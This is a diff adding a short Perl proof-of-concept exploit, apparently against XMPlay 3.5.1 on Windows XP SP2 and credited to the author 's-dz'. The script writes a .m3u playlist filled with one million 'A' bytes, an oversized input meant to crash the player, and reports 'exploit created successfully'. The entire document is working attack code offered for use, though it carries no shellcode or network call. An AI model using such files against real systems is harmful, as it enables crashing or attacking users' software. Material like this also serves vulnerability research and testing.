@@ -1,0 +1,15 @@
+#!/usr/bin/perl
+# Xmyplay 3.5.1 
+# Author: s-dz        , s-dz@hotmail.fr
+# Download : http://us2.un4seen.com/files/xmplay35.zip
+# Tested : Windows XP SP2 (fr)
+# DATE   : 2010-07-31
+
+my $file= "mahboul-3lik00.m3u";
+my $junk= "\x41" x  1000000;
+
+open($FILE, ">$file");
+print($FILE $junk);
+close($FILE);
+print("exploit created successfully");
+
